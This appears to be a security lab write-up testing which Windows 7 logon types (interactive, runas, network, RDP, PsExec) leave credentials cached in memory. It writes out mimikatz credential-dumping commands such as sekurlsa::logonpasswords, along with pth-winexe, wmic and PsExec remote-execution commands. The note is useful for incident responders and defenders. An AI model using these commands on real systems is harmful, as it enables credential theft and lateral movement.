# Network vs Interactive Logons

## Network vs Interactive Logons

Tested against Microsoft Windows 7 Professional 6.1.7601 Service Pack 1 Build 7601

### Interactive Logon (2): Initial Logon

Let's make a base password dump using mimikatz on the victim system to see what we can get before we start logging on to it using other methods such as runas, psexec, etc. To test this, the victim system was rebooted and no other attempts to login to the system were made except for the interactive logon to get access to the console:

{% code title="attacker\@victim" %}
```csharp
mimikatz # privilege::debug
mimikatz # sekurlsa::logonpasswords
```
{% endcode %}

Credentials were cached and got dumped by mimikatz:

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LJdRmJZ8gupqVkvv3Dv%2F-LJdg87z_S6LDwruxOkn%2Fpwdump-test1.png?alt=media\&token=1123b99f-7776-48d1-952c-86717abedd1a)

### Interactive Logon (2) via runas and Local Account

{% code title="responder\@victim" %}
```csharp
runas /user:low cmd
```
{% endcode %}

{% code title="attacker\@victim" %}
```csharp
mimikatz # sekurlsa::logonpasswords
```
{% endcode %}

Credentials were cached and got dumped by mimikatz:

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LJdRmJZ8gupqVkvv3Dv%2F-LJdhWm35MJLXPNslvnd%2Fpwdump-test2.png?alt=media\&token=619cde1c-965d-40c4-9491-c5409ab2d25b)

### Interactive Logon (2) via runas and Domain Account

{% code title="responder\@victim" %}
```csharp
runas /user:spot@offense cmd
```
{% endcode %}

{% code title="attacker\@victim" %}
```csharp
mimikatz # sekurlsa::logonpasswords
```
{% endcode %}

Credentials were cached and got dumped by mimikatz:

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LJdkMbuH3BBT_JBTEEq%2F-LJdlUDii1GKafzlaTfb%2Fpwdump-test3.png?alt=media\&token=d845e479-cd9b-495b-b397-4ea9a6210419)

### New Credentials (9) via runas with /netonly

```csharp
runas /user:low /netonly cmd
```

Note that event logs show the logon of type 9 for the user `mantvydas`, although we requested to logon as the user `low`:

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LJe82ow4RCV2_7kJeN2%2F-LJe8ID69Mb5sYNeEs70%2Fpwdump-runas-netonly.png?alt=media\&token=b246886f-82f2-4e85-852f-3498cc21b824)

Logon type 9 means that the any network connections originating from our new process will use the new credentials, which in our case are credentials of the user `low`. These credentials, get cached:

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LJe82ow4RCV2_7kJeN2%2F-LJe8vj2ScUnNEe3lAVa%2Fpwdump-runas-netonly-dump.png?alt=media\&token=6f5022ab-2506-40bd-a8c0-5df256b83622)

### Network Logon (3) with Local Account

Imagine an Incident Responder is connecting to a victim system using that machine's local account remotely to inspect it for a compromise using pth-winexe:

{% code title="responder\@victim" %}
```csharp
root@~# pth-winexe //10.0.0.2 -U back%password cmd
```
{% endcode %}

{% code title="attacker\@victim" %}
```
sekurlsa::logonpasswords
```
{% endcode %}

Mimikatz shows no credentials got stored in memory for the user `back`.

### Network Logon (3) with Domain Account

Imagine an Incident Responder is connecting to a victim system using a privileged domain account remotely to inspect it for a compromise using pth-winexe, a simple SMB mount or WMI:

{% code title="responder\@victim" %}
```csharp
root@~# pth-winexe //10.0.0.2 -U offense/spot%password cmd
```
{% endcode %}

{% code title="responder\@victim" %}
```
PS C:\Users\spot> net use * \\10.0.0.2\test /user:offense\spotless spotless
Drive Z: is now connected to \\10.0.0.2\test.

The command completed successfully.

PS C:\Users\spot> wmic /node:10.0.0.2 /user:offense\administrator process call create calc
Enter the password :********

Executing (Win32_Process)->Create()
Method execution successful.
```
{% endcode %}

{% code title="attacker\@victim" %}
```
sekurlsa::logonpasswords
```
{% endcode %}

Mimikatz shows no credentials got stored in memory for `offense\spotless` or `offense\administrator`.

### Network Interactive Logon (10) with Domain Account

RDPing to the victim system:

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LJdsSjdHcKll8G7oFtw%2F-LJdtAVhLq-Hbo3o8TSO%2Fpwdum-test5.png?alt=media\&token=9556984a-3ac7-495a-99df-a5707b455487)

Credentials were cached and got dumped by mimikatz:

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LJdsSjdHcKll8G7oFtw%2F-LJdtS7AXcWxW9Bwdmiv%2Fpwdump-test6.png?alt=media\&token=90a83853-330a-4e11-993a-54d5d99d3667)

Note that any remote logon with a graphical UI is logged as logon event type 10 and the credentials stay on the logged on system:

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LJdtt4-VgaCyGF3x9iv%2F-LJdtpMhb15HnrY2kmKY%2Fpwdump-logon10.png?alt=media\&token=87c10f6d-a7ea-4e3a-8fb8-3f168f92d37b)

### PsExec From An Elevated Prompt

{% code title="responder\@victim" %}
```csharp
.\PsExec64.exe \\10.0.0.2 cmd

PsExec v2.2 - Execute processes remotely
Copyright (C) 2001-2016 Mark Russinovich
Sysinternals - www.sysinternals.com

Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>
```
{% endcode %}

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LJe11whFS1tvPes2UIg%2F-LJe2YmNf84My-0Mvh6T%2Fpwdump-psexec-no-atlernate-credentials.png?alt=media\&token=f4eb2fb4-2cd4-44ff-894b-6beec9748a78)

Mimikatz shows no credentials got stored in memory for `offense\spot`

Note how all the logon events are of type 3 - network logons and read on to the next section.

### PsExec + Alternate Credentials

{% code title="responder\@victim" %}
```csharp
.\PsExec64.exe \\10.0.0.2 -u offense\spot -p password cmd
```
{% endcode %}

Credentials were cached and got dumped by mimikatz:

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LJe11whFS1tvPes2UIg%2F-LJe1IaFJp_qYx4s682Z%2Fpwdump-psexec-supplied-creds.png?alt=media\&token=094a761d-4960-4fdf-9933-7ddf7e0e6827)

Looking at the event logs, a logon type 2 (interactive) is observed amongst the network logon 3, which explains why credentials were successfully dumped in the above test:

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LJe11whFS1tvPes2UIg%2F-LJe1fVxZ3al1kkqNh5X%2Fpwdump-psexec-interactive-logon.png?alt=media\&token=0c5dce61-5160-4218-81e7-11f5b9f90cf3)

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LJe11whFS1tvPes2UIg%2F-LJe1o1fLDFS-IcFxMpb%2Fpwdump-psexec-eventlog.png?alt=media\&token=d4437c0e-9c97-48d8-ad13-759e0a1526ac)

### Observations

Network logons do not get cached in memory except for when using `PsExec` with alternate credentials specified via the `-u` switch.

Interactive and remote interactive logons do get cached and can get easily dumped with Mimikatz.

### References

{% embed url="https://digital-forensics.sans.org/blog/2012/02/21/protecting-privileged-domain-account-safeguarding-password-hashes" %}
